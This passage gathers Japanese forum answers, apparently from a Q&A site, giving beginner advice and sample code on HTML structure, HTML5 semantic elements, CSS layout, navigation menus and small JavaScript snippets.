＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
通常nameに反応しなくてもidには反応するんですけどね 同じidを2か所以上につけているとかもないですよね？
連投ご無礼。<(_ _)> ソース見ても意味なかったですね。 sakura.jpgがサーバー側に正しく転送されてるか確認してください。
★そのままだと実際にHTML書くと間が開くはずでよ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ それでは文法間違いですから <div id="header"> <h1>header</h1> </div> <div id="content"> <h2>Main</h2> <p>ここに段落が入る。</p> </div> と正しく書き直してご覧なさい。 ※理由、h1,pなどにmarginがあるため。 　まずHTMLから、 　CSSを学ぶ前提ですので下記リンク先に目を通しておくこと。 ⇒メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。.( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　HTMLでは文書構造だけをきちんとマークアップします。HTML4.01では構造を示す要素が不足していますので『id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ことになっています。HTML5では、『文書をよりよく構造化するために、・・要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』ので、その要素名と【用途】を利用すると良いでしょう。 ★HTML4.01strict で説明します。 　XHTMLは必要ないでしょう。---今後はHTML5が主流となる。 　transitionalは使うべきではありません。ブラウザ間の誤差の原因となる。 　『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 【第一ステップ】 　HTML4.01strictでHTMLを作成して、Another HTML Lint Gateway( http://www.htmllint.net/html-lint/htmllint.html# )などでチェックする。 ※id="sidebar"のようなid,class名はつけない。ひょっとするとサイド以外に配置するかもしれない。必ず文書の構造を保管する目的で!!!。後々絶対に楽です。 ※ header,section,footerは文書内の何度も登場するのでidではなくclassのほうがよい。 【スタイルシート】上から順番に記述して確認して見ましょう。 ★HTML4.01strict 　ブラウザ間の誤差がほとんどないstrict 　Another HTML Lint Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　で確認済み ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* 判りやすいように最初に色を付けておく */ body{background-color:silver;} div.header{background-color:blue;} div.section{background-color:fuchsia;} div.section div.section{background-color:rgb(255,200,200);} div.nav{background-color:green;} div.footer{background-color:lime;} div.header,div.section,div.footer{ width:90%; margin:0 auto;/* 上下余白0,左右自動 */ min-width:470px;max-width:1000px;/* 最大幅と最小幅(ウィンドウ幅を変えてみよう) */ } h1,h2,h3,h4,h5,h6,p{ margin:0;line-height:1.6em;/* マージンを消して行の高さを高く */ } div.section{position:relative;}/* 位置やサイズの基準にするため */ div.section div.nav{ position:absolute;top:0;left:0; width:200px; height:100%; } div.section h2,div.section p,div.section div.section{ margin-left:210px; } div.section div.section{ width:auto; min-width:0; } div.section div.section p{ margin-left:0;/* 先の指定を上書きして消す */ } html,body{ margin:0;padding:0; } p{ text-indent:1em; } div.header,div.section,div.footer{ padding:5px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<div class="section"> ＿＿＿<h3>項見出し</h3> ＿＿＿<p>本文項記事</p> ＿＿＿<p>sectionの階層でレベルが判断される</p> ＿＿</div> ＿＿<div class="section"> ＿＿＿<h3>スタイルシートの書き方</h3> ＿＿＿<p> ＿＿＿＿セレクタの書き方や詳細度などはCSS(カスケーディング スタイル シート)の命といえる仕組みです。しっかり最初に身につけましょう。 ＿＿＿</p> ＿＿＿<ol> ＿＿＿＿<li><a href="http://momdo.s35.xrea.com/web-html-test/spec/CSS …セレクタ</a></li> ＿＿＿＿<li><a href="http://momdo.s35.xrea.com/web-html-test/spec/CSS …プロパティ値とカスケーディング、継承の割り当て</a></li> ＿＿＿</ol> ＿＿</div> ＿＿<div class="nav"> ＿＿＿<h3>目次</h3> ＿＿＿<ul> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="/books">BOOK</a></li> ＿＿＿＿<li><a href="/support">SUPPORT</a></li> ＿＿＿</ul> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
<a>Home</a><a>Home</a>
回答が的外れだったら済みません。「ページ内」がブラウザの１ページを意味するのなら、わたしが使用している「I・E　Ver１１」で「gogle」の検索の場合、次のようにメニューが表示されるように設定し、 　　ファイル（F） 編集（E）表示（V）お気に入り（A）ツール（T）ヘルプ（H） 「編集」→「このページの検索」と開いて出た検索窓に、例えば「趣味の」と記入します。「オプション」で「単語単位で探す」を選ぶと後に「○件の一致」と出てその部分に黄色いマークが付きます。「次へ」を押すと、次のマークが青色に変わります。それを順番に見ていきます。（面倒かも知れませんが）　検索の語句を「趣味」とした方が良いのかも。 　多くのサイトを見たければ、「趣味」で検索するとかなりのサイトがヒットします。
×　href="css/jquery.maximage.css" ○　href="/css/jquery.maximage.css" ここかな？
floatはあまり使わないほうがよいとは思いますが・・・ もう少し具体的にHTMLと、されたいデザインを提示してください。 Q:リストは二つだけなのか? >AAAは左に、BBBは右に持ってきたい ┌────┬────┐ │リンク１│リンク２│ ├────┼────┤ │リンク３│リンク４│ ├────┼────┤ とか、 ┌────┐記事・・・・・・・┌────┐ │リンク１│記事・・・・・・・│リンク２│※　この場合に限りfloat └────┘記事・・・・・・　└────┘ 　記事・・・・・・・・・・・・・・・ あるいは、 　　　　┌────┬────┐ 　　　　│リンク１│リンク２│ 　　　　└────┴────┘ 　図でイメージを示されると良いです。 >CSSのクラス内の同じ要素のもの なお、#は一意セレクタで、クラスセレクタではありません。 　同じではないはずです。 ・最初の項目⇔二番目の項目 　　　　隣接セレクタ+、first-child、nth-child, ・偶数番目の項目と奇数番目の項目　nth-child ・リンク先が異なる。　　　　　　　属性セレクタ 　など異なる要素ですね。当然セレクタで区別できます。 classやidはデザイン目的ではつけてはなりません。あくまで、『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』なのですよ。先でデザインをdropmenu以外にしたくなったとき早速困るでしょうし、HTMLのメンテナンスもしにくくなります。 　それがナビゲーションなら <div class="nav"> 　<ul> 　　<li><a href=""></a></li> HTML5だとDIV自体安易に使えなくなりますから <nav> 　<ul> 　　<li><a href=""></a></li> になります。これでナビゲーションリンクだと判るのでメンテナンスも楽ですし、デザインは自在に変更できる。 ※構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://ichiya.com/WebService/Howto/sample/HTML/n … ) にて、chrome以外のブラウサで、[表示]→[スタイル]で様々なスタイルシートを洗濯してご覧なさい。HTMLソースと比較するといっている意味がわかるかと。
おそらくphpんp文字コードがutf-8になっていない。 レンタルサーバがKDDI/ACE01とかじゃない？
こんにちは。 他の方の回答にもあるように、イメージマップやtitle属性を利用するのが簡単かつ良策だと思いますが・・・ 実際がどのような利用になるのかよくわからないので、いろいろ適当ですが、こんな感じでしょうか？ ※イメージマップは利用していませんが、利用した方が 　スクリプトを大幅に簡略化できます。 ※表示内容は、とりあえず画像のalt属性の内容を利用。 ※表示するツールチップを吹き出し風にするのにCSSで 　細工をしてますが、単にdivで良ければ省略できます。 （全角空白は半角に） <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html lang="ja"> <head><title>test</title> <meta http-equiv="Content-Style-Type" content="text/css"> <meta http-equiv="Content-Script-Type" content="text/javascript"> <style type="text/css"> img.tooltip{ width:300px; height:300px; } #tipBox{ position:absolute; } #_tipBox div { position: relative; display: inline-block; padding: 5px 15px; min-width: 60px; color: #000; text-align: center; background: #FFA; } #_tipBox div:after { content: ""; position: absolute; display: block; top: 12px; left: -20px; margin-top: -10px; width: 0px; height: 0px; border-style: solid; border-width: 6px 20px 6px 0; border-color: transparent #FFA transparent transparent; } </style> <script type="text/javascript" src="http://www.google.com/jsapi"></script> <script type="text/javascript">google.load("jquery","1");</script> <script type="text/javascript"> $(function(){ var t = $("<div id='_tipBox'></div>").appendTo($("body")) 　　　　.css({ position: "absolute" }).hide(); var tooltip = { 　target : null, offset: null, tip: t, 　enter: function(elm){ 　　this.target = elm; 　　this.offset = elm.offset(); 　　this.tip.html("<div>" + elm.attr("alt") + "</div>"); 　}, 　out: function(){ this.target = null; }, 　appeal: function(x, y){ 　　if(!this.tip.is(":visible")) 　　　this.tip.css({ top:y-10, left:x+25 }).show(); 　}, 　clear: function(){ this.tip.hide(); } }; $("img.tooltip").on("mouseout", function(){ tooltip.out(); })　 　.on("mouseover", function(evt){ tooltip.enter($(evt.target)); }) 　.on("mousemove",function(evt){ 　　if(!tooltip.target) return; 　　var posX = evt.pageX - tooltip.offset.left 　　var posY = evt.pageY - tooltip.offset.top; 　　if(50<posX && posX<60 && 20<posY && posY<80){ 　　　tooltip.appeal(evt.pageX, evt.pageY); 　　} else { 　　　tooltip.clear(); 　　} }); }); </script> </head> <body> <div> <img class="tooltip" src="A.jpg" alt="hogehogetest"> <img class="tooltip" src="B.jpg" alt="fugafugatest"> <img class="tooltip" src="C.jpg" alt="piyopiyotest"> </div> </body> </html>
単純に https：//xxx.co.jp/order/001 でPATH_INFOで渡すのが楽です。 orderがphpになります。 phpなのかCGIなのかは関係ありません。
例えば見出しですから <h1><img src="" width="" height="" alt="大体テキスト"></h1> でしたらろ・・・・h1がそこしかなければ h1{text-align:center;} 追加 ないしは <h1 style="text-align:center"><img src="" width="" height="" alt="大体テキスト"></h1> ですむはずですが
emmet （旧zen-coading）というプラグインです。mac・winともに使えますが、エディタが対応している必要があります。 エディタではなく、エディタに付加して使います。hoge3600さんの愛用エディタはなんでしょう？使えるといいですね。愛用エディタと一緒にemmetまたはzen coadingを検索すれば、インストールできたみたいな情報がヒットすることがよくあります。 尚、emmet （旧zen-coading）はフリーでかつ大変便利ですので、検索すればインストールや使い方など大量にページがヒットしますので、詳しくはお調べください。
他の方が指摘した点に加えて、chromeのズーム機能が原因では？ホームページを拡大・縮小して表示する機能で、一度変更するとページを再読込してもそのままの縮尺になってしまうので、まずは以前に間違ってページを縮小表示していないか確認してみてはどうでしょう。
意図がよくわからないのと、ご提示のスクリプトとHTMLが整合していないので、混乱するけれど・・・ 要は"126"というデータを送りたいけれど、送れていないという意味でいいのかしら？ 指定アドレスに遷移するようですから、submitするようにしてしまえばいいのでは？ （遷移しないのならajaxを利用） …ってことで、いろいろと推測混じりですが、こんなんでどうでしょう？ function post(num){ var frm = document.forms["test"], elms = frm.elements; elms["id"].value = num; frm.action = elms["select"].value; frm.submit(); } ※受け取る側がHTMLの場合は、cookieやWeb Storageを利用するのがよろしいかと。 　（クロスドメインではうまくいきませんが…）
さっき回答した者です。 日本語版をダウンロードしましたか(゜.゜)? こちらです。 http://jp.softyp.com/win7/download-firefox/ すみませんマナテックサイトと言うのはわからないのですが、 フォントをいじってみれば解決すると思います。
まず間違いなくきちんと表示されます。 今時、日本語フォントの入っていない環境は考えづらいです。 Windowsで言えば2000かXPくらいで既に各国語のフォントは標準装備されています。 Macはよく知りませんがイメージ的に多言語対応はWindowsに先んじていそうです。 スマートフォンはむしろ国際化対応が常識になってから生まれたのでさらに余裕です。 半角のカギ括弧は半角カナに属すので、全角より表示されやすいということはありません。
こんにちは。 画像類が入ったフォルダを複製後、元のフォルダ名を変更すると 複製先のAIファイルの画像リンク先が自動でかわりませんか？
重なるのが嫌なら、floatにすればいい。そうすれば、重なる状況では下に落っこちる。 どうしたら？ではなく、どうしたいのかです。なぜ重なるのかは、左右の幅が合計で親要素の100%を越えているからではないかと推察します。計算してみてください。 左右の幅がmarginとwidth+border+paddingの合計の値が親要素の100%以下になっていますか？ または、 box-sizing: border-box;の指定をし、marginとwidthの合計の値が親要素の100%以下になっていますか？ どうしたらよいのでしょうかって、私は重なっても困らないので、そのままでもいいのでは？と思います。dragon_さんが、どうしたいの？サイズを小さくしてでも重ならないようにしたいのか、大きさはそのままで別のデザインにしたいのか？ 以下は幅50%のdiv要素を左右交互に配置した例です。50%が2つなので、100%です。 <style type="text/css"> div{ width:50%; box-sizing: border-box; float:right; margin:0; padding:1em; background:#ffdddd; border:1px solid #ffffff; } div:nth-child(odd){ float:left; background:#ccffff; } </style> </head> <body> <div>1</div> <div>2</div> <div>3</div> <div>4</div> <div>5</div> <div>6</div> <div>7</div> <div>8</div> </body> </html>
やりたい事が今一つ理解できませんが更新というのはF5押下時のような更新の事でしょうか？ だとすると変数がすべて初期化されるので初期化されないようにサーバにファイルを書き出すなどしてそのファイルの中身によって判断するのはどうでしょう？ 一方，更新というのがボタン押下などによるデータ更新のことならtargetに表示しないiframeなどを指定すればページ全体を再読み込みしないので画面の状態は変わらないかと。 参考サイト：http://www.eclip.jp/blog/1098.html ソースを載せて下さればもう少しやりたい事が分かって回答がつくかもしれません。
HTML の機能では出来ません。 サーバー側プログラムを用意して動的に書き換えるのがもっとも素直です。 サーバー側をどうにかできない場合の素直じゃない方法として、 ページ内のスクリプトだけで頑張る方法も一応あります。 ただ色々面倒だし制約もあるので、あくまでも参考までに === "AJAX" でなんとかする場合、ただしサーバー配置しないと無効 === ページA.html ほげほげ <div id="important"> 重要なお知らせ </div> ぼけぼけ === ページB.html <script> addEventListener('DOMContentLoaded', function(){ _ var req = XMLHttpRequest(); _ req.addEventListener('load', function(ev){ _ _ var elm = document.createElement('div'); _ _ elm.innerHTML = ev.target.responseText; _ _ var im = elm.querySelector('#important'); _ _ if (im) document.getElementById('note').appendChild(im); _ }, false); _ req.open("GET", "ページA.html"); _ req.send(); },false); </script> ... <div id="note"></div> === "ページ間通信" でなんとかする場合、ただしブラウザによっては無効 === ページA.html <script> window.addEventListener('message', function(ev){ _ if (ev.data == 'getImportant') { _ _ var imp = document.getElementById('important'); _ _ if (!imp) rereturn; _ _ var txt = 'important:' + imp.innerHTML; _ _ ev.source.postMessage(txt, '*'); _ } }, false); </script> ... <div id=important> 重要なお知らせ </div> === ページB.html <script> window.addEventListener('message', function(ev){ _ var txt = ev.data; _ if (/^important:/.test(txt)) { _ _ document.getElementById('note').innerHTML = txt.replace(/^important:/,''); _ } }, false); window.addEventListener('DOMContentLoaded', function(){ _ var fr = document.createElement('iframe'); _ var fx = function(){fr.contentWindow.postMessage('getImportant', '*')}; _ fr.addEventListener('load', fx, false); _ fr.style.display = 'none'; _ fr.src = 'ページA.html' _ document.body.appendChild(fr); },false); </script> ... <div id=note></div>
＞ホームページビルダー１９、SPで作ったらほぼ自分の好みに近い形、内容のものができましたが、 　「ほぼ」と言うより、相当な初心者、それも間違った沢道に迷い込んでいる。このままだと本堂に戻るのが大変になるので、早めに直しましょう。 　以下、参照すべきリンク先を併記して詳しく説明しますから、リンク先も読んでおくこと。 　HTMLは、デザインツールではありません。 2.4.1 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 【最も重要な基礎知識】 　HTMLは、その文書を構成する要素(Element)に分解し、それぞれの要素をタグを用いて、どんな要素であるかを示すマークアップ言語です。 <body><!-- ここから本文(body)-- > <h1>ここはこの文書の最上位の見だし(heading)</h1> <p>ここから一つの段落(Pargraph)であり<q>ここは引用(quote)語句</q>です。</p> とね。もっぱら文書の構造を示していくのがHTMLです。HTML4(XHTML1.1)以前は、文書の意味を示す要素が不足していたため、『id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』しなければなりませんでした。★デザインのためにDIVやSPANを使うのじゃない★ 　その反省から、HTML5では、『文書をよりよく構造化するために( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』新しい要素が追加されました。 　これについては、 HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 　の中ほどの「【問題2】文書内に埋め込まれた「意味」が不明確」も読むこと!! 　それによって、検索エンジンはそのページの内容を正確に把握できるようになります。これこそがSEO 検索エンジン最適化(Search Engine Optimization)の本来の意味であり、目的なのです。それによって検索結果に反映されるのは、結果であって、決して検索順位を上げるための手順が目的ではありません。 　デザインは、文書構造さえ適切にマークアップされていれば、自在に、そして効果的にできますから、シンプルなHTMLとあいまってメンテナンス性も向上します。副次的に検索結果にも反映される。 　これらの基本を知らずしてオーサリングツール--特にビルダーのような最悪なツールを使用すると、このウェブ標準に反したものができてしまいます。 https://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC … 　HTMLを知らなくても良いページができるなんてありえないのですょ。良心的なオーサリングツールは、HTMLやCSSを知らなければ扱えないと言っている。 [基本]デザインためにHTMLは作らない。 　まず、ページ全体を平のテキストで書いていきます。 　ついで、その文書を読み解いて要素に分解し、それぞれの要素を示すタグでマークアップする。 　示しきれないときはclass名を併用してDIVやSPAN要素を使う [デザインする] 　シンプルなページができるはずです。そのページはブラウザの持つデフォルトのスタイルシートで装飾されているはずです。 　それぞれの要素をセレクタを使って指定してスタイルシートでデザインして行きます。 　こうなると、反ってビルダーは極めて扱い難いツールになってしまいます。文章を読んで、要素に分解して、それに最適なタグを選択するなんて作業はツールにはできません。著者であるあなたにしかできない。 　デザインを適用したい要素を、セレクタを駆使して特定する作業は、どんなオーサリングツールでも不可能でしょう。 　例えば、div.secton div.section+div.section p{color:blue;}とは、section(主題)中の主題に続く(;)主題中の段落の・・・・・・文字色は青・・なんて、セレクタの書き方を知らないとツールは手助けしてくれない。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒HTMLエディタで作成するシンプルなコードは検索エンジン最適化にも効果的であることから、一部のウェブデザイナーには見直されつつあり( https://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83 … ) 実例のサンプル ナビゲーションリストを様々にデザインしてみよう。( http://ichiya.com/WebService/Howto/sample/HTML/n … ) のページに行って、ページの右クリックからHTMLソースを見るとビルダーが作ったものと一目で違いがわかるシンプルな物で、記事の追加やメンテナンスが容易なこと、検索エンジンが内容を把握しやすいことが分かるでしょう。 　ついで、ブラウザ--chromeを除く)の[表示]メニューからスタイル(シート)を選択して、色々用意されているスタイルシートを選択してみましょう。また[ファイル]メニューから印刷プレビューも確認してみましょう。HTMLに文書構造しか書かれていないから、「自分の好みに近い形」ではなく「自分好みのデザイン」に自在にできるのですよ。デザイン変えたければスタイルシートだけ書き直せばよいし、携帯電話やスマホに対応させたければ、そのスタイルシートだけ書けば良い。 　あなたが最初にテキストエディタから入られたのだったら方法を変えるのは簡単なのですが、もしビルダーから始められたら大変な苦労をされることになるでしょう。なぜならビルダーは、本来のウェブとは逆のアプローチで作られたツールなのですから。
幅を固定したらダメです。 <body> 　<header> 　　<h1>見だし</h1> 　　<nav> 　　　<ul> 　　　　<li><a href="#">HOME</a></li> 　　　　<li><a href="#">menu</a> 　　　　　<ul> 　　　　　　<li><a href="#">menu1</a></li> 　　　　　　<li><a href="#">menu2</a></li> 　　　　　</ul> 　　　</ul> 　　</nav> だったとします。 CSSは header nav{width:100%;position:relative;text-align:center;line-height:30px;background-color:yellow;} header nav ul,header nav ul li{margin:0;padding:0;list-style-type:none;font-size:0;} header nav ul li{display:inline-block;width:16%;position:relative;font-size:15px;} header nav ul li a{display:block;width:100%;height:100%;} header nav ul li ul{position:absolute;top:30px;width:100%;} header nav ul li ul li{width:100%;display:block;} header nav ul li ul{display:none;} header nav ul li:hover ul,header nav ul li:focus ul{display:block;} header nav ul li:hover a{background-color:lime;} header nav ul li a:hover {background-color:rgb(200,255,200);} スマホに対してmediaqueryを用いてデザインを切り替える場合は、別途追加すればよい。
例示のウェブサイト(ＷＳ)でしたら、　アマチュアでも制作可能だとおもいます。 つまり、　こんな程度のＷＳの制作で飯喰って行くのは難しいですね。 グラフィックス系・ＨＴＭＬ系の他に がっつり、PHP/JAVA/C#/RUBY/PYTHON の中からいくつか・・・ CGIも自作で行きましょう。 Visual Studio の普及はどうなんでしょうね。 頑張って下さい。
ｉｎｔｅｒｎａｔｉｏｎａｌ 　　　　　　　　　　　￣ ＞ _a_ とか (a)とか 色々無いです、前者はアンダーバーＡアンダーバーですし、後者はカッコＡカッコ閉じる ですし 全角文字にオーバーライン（上つきの横線）がありますから、それを使って Ａの下の行に横線を引くしかありません。 テキストファイルではなくワードなどのソフトを使えばＡの下に下線を引く事は可能です
描画する内容にもよってくるかもしれませんが、 http://d.hatena.ne.jp/rikuo/20141203 とか参考になるかもしれませんね。 実際のファイルも置いて下さっているので、 中身を比較してみれば大きさの変更部分も記載があるかと…（・_・）
拒否していることを知られずに拒否することは出来ません。 ユーザーエージェントがクローラーの時だけ拒否するようにhttpd.confや.htaccessに書けばいいと思いますが、アクセス権で拒否しても拒否されたことはわかります。 クロールを拒否したいというのが目的であれば robots.txt で拒否するのが簡単だと思いますよ。
HTML5--html5ではない。英語圏で大文字は省略形や頭文字を示します。この場合はHyper Text Markup Languageですから)--では、文書構造を明確に示されるように新しい要素が追加されました。 　HTML4では、<h1>とか<<blockquote>とか<address>、<p>位しかなくて、idやclassとDIVやSPANを併用して文書構造を示すしかありませんでした。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　あなたがHTML4.01の時代に <div class="header"> 　<div class="nav"> としていた物が、 <header> 　<nav> とかけるようになったという事です。 ・Webの3つの問題を解決する「HTML5」とは何なのか( http://www.atmarkit.co.jp/ait/articles/1008/30/n … )の中ほど『問題2】文書内に埋め込まれた「意味」が不明確』を読んでおくこと 　header要素は、その文書のヘッダーを示す要素ですから、文書の見出し<h1>～<h6>とか、サイトのナビゲーションが入っても良いでしょう。本文(section)の目次が入る場合もあるでしょうが、それはsection内に入れるほうが良いでしょうね。 ＞一番上に、ロゴが左にあって、その横にナビボタンが並ぶレイアウトにするつもりなのですが (^^; 　ロゴはその文書の内容には関係ないのでHTMLには書かなくても良いでしょう。ナビゲーションに含めても良い。 <body> 　<h1>ページのタイトル</h1> 　<nav> 　　<ul> 　　　<li><a href="/">TOP</a></li><!-- これをロゴにデザイン --> 　　　<li><a href="/Products">製品</a></li><!-- リンクボタンにデザイン --> 　　　<li><a href="/Manual">マニュアル</a></li> HTML5では、『一番上に、ロゴが左にあって、その横にナビボタンが並ぶレイアウト』というようなプレゼンテーション/デザインは一切考えずに、文書構造だけをマークアップすることになります。DIVなどは原則使えなくなります。 　そして、『一番上に、ロゴが左にあって、その横にナビボタンが並ぶレイアウト』なんてのはスタイルシートに任せます。デザインを目的にHTMLは書かない・・・・まあ、これはHTML4.01のときも『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』として散々言われ続けてきたことなのでいまさらですが。
そんなものに影響は受けません。あったとしても微々たる物ですね。 <header> 　<nav> 　　<ul> 　　　<li><a href="/">トップ</a></li> 　　　<li><a href="/products">製品</a></li> 　　　<li><a href="/manuual">マニュアル</a></li> だろうが <header> 　<nav> 　　<ul> 　　　<li><a href="/"><img src="" width="" height="" alt="トップ"></a></li> 　　　<li><a href="/products"><img src="" width="" height="" alt="製品"></a></li> 　　　<li><a href="/manuual"><img src="" width="" height="" alt="マニュアル"></a></li> だろうが、検索エンジンには同じものにしか見えない。 　前者の長所は、HTMLが簡単でプレゼンテーションはスタイルシートに任せてあるので、HTMLもCSSもメンテナンスがとっても楽ですね。 　スタイルシート書き換えれば、そく膨大なサイトでも一瞬でデザインが変えられる。スマホや携帯用にデザインを変えることも容易です。 どちらを選択するかは、その画像がそのページのコンテンツですあるか、背景であるかだけです。アルバムのページで <section id="albam"> 　<tl> 　　<th><img src="" width="" height="" alt="山中湖から望む降雪した富士山"></th> 　　<dd></dd> なんてのを <section id="albam"> 　<tl> 　　<th>山中湖から望む降雪した富士山</th> 　　<dd></dd> こうは書きませんし、書くべきではありません。 SEOとは、本来検索エンジン最適化Search Engine Optimizationの意味で、検索エンジンにページ内容が正確に伝わるようにする手法の総称ですよ。 　それがあるから、検索順位の上位になるのであって、それが目的ではない。結果に過ぎない事を忘れたら意味無いです。
スマートフォン版は、PC版で表示するに設定していると自動で表示されます。 PCからスマートフォン版の設定は、ブログ設定 ＞ スマートフォン ＞ レイアウトタブ ＞ 個別記事ページ ＞ 記事本文パーツから非表示やラベルの編集を行ってください。スマートフォンからも設定可能です。
普通に考えればこうしますが、なにかそうできない理由がありますか？ <form method="get"> <input type="text" name="a" value="b"> <input type="text" name="c" value="abc"> <input type="submit" value="Search"> </form> テキストボックスを見せたくないならtype="hidden"で隠してください
html5でもそれ以前でも、divを使ってはダメってことはないです。 html5では意味的なマークアップやセクショニングが多く追加されたので、今まではdivで一括りにしていたものが、”セクションとしての意味を持つものであれば”div以外の該当するタグを使うのが望ましい、といった思想です。 結論をいうと、”全体を包んでセンター寄せにする”ような装飾的な意味しか持たないものであればdivでいいと思います。 装飾だけの目的ではなく、内容としての区切りになっていればセクションやarticleを使った方がいい場合があります。
htmlをしっかり覚えて次のステップとして、html5を覚えられる事をお勧めします。 ところで、明日の夜お時間ありますか？ というのも、生涯学習サイトのスク―で、明日htmlを学びたい人を対象とした「生授業」（動画）が配信されます。会員登録は必要ですが「生授業」は無料です。これを録画した「録画授業」は月500円程度が必要になるので「生」の時に見ておくと、あとで紙やwebページを見ながら学習するにしてもイメージが付きやすくお勧めです。イメージできると学びやすくなると思います。3限目にはhtml5にも触れられるようです。 タイムリーなので、ご紹介します。 HTML入門（全3回） 1限目：HTML入門 第1回 〜HTMLとタグ〜 2015年2月6日（金）19:00～生放送 2限目：HTML入門 第2回 〜見た目だけじゃない、HTML〜 2015年2月6日（金）20:15～生放送 3限目：HTML入門 第3回 〜これからのHTML〜 2015年2月6日（金）21:30～生放送 詳しくは、 https://schoo.jp/class/1858 スク―トップ https://schoo.jp/ JavascriptやjQueryやPHPなどの授業のほかにも、デザイン・英語や起業等の授業があります。興味がありましたら、お見逃しなく。会員登録して明日19:00をお待ちください。
字源にありました。 http://jigen.net/kanji/25611 が、普通にPC上で使えるような気がしません。 試しにコピペ・・・搋 うまくいくかな？
というか、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」は基本ですから、単純にtable書いてスタイルシートで調整するほうが楽ですし危険もない。そもそも上記に書かれているようにメンテナンスも楽になる。失敗したらスタイルシート書き換えればよい。 　スタイルシート使うと、HTML使うよりはるかに多彩なデザインができますよ。HTMLシンプルなのでメンテナンスも楽。 ※タブは　(全角スペース)に置換してあるので戻す。 <table border="1" summary="サンプルの表"> 　<tbody> 　　<tr> 　　　<th>一列目</th><th>二列目</th> 　　</tr> 　　<tr> 　　　<td>1行1列目の要素M</td><td>1行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>2行1列目の要素</td><td>2行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>3行1列目の要素</td><td>3行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>4行1列目の要素</td><td>4行2列目の要素</td> 　　</tr> 　</tbody> 　　</table> に対して、<head></head>内に <style type="text/css"> <!-- table[summary="サンプルの表"]{ border-collapse:separate;/* 分離して描く */ border-spacing:0px 30px;/* 左右の間隔が0px、縦の間隔が30px */ border-style:double; border-color:red; border-width:5px; } table[summary="サンプルの表"] th, table[summary="サンプルの表"] td{ border-style:solid; border-color:blue; border-width:2px 0;/* ボーダーの巾上下2px 左右0 */ padding: 0 20px; } table[summary="サンプルの表"] tr:nth-child(2n) td{ background-color:yellow; } table[summary="サンプルの表"] th{ background-color:aqua; } --> 　</style>
誰がいったか知らないが。。。 ★単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　は1999年のHTML勧告以来、とても強く言われ続けてきたことです。 　また<font>要素はありませんし、color=""やalign=""の属性も代表的な非推奨です。ブラウザは「古い仕様も対応しなければならない」のですが、それとは別 　もちろん<font>という行内要素内にdivというブロック要素は入れられません。 単純に見出しですから、HTMLは、 <div class="header"> 　<h1><iframe>みーちゃん</iframe><a href="">Miiko's<br>Photo.</a></h1> </div> だけで良いのですよ。 　あとはスタイルシートで、プレゼンテーションは指定します。あとが好きに変更できる。メンテナンスがとても楽になります。
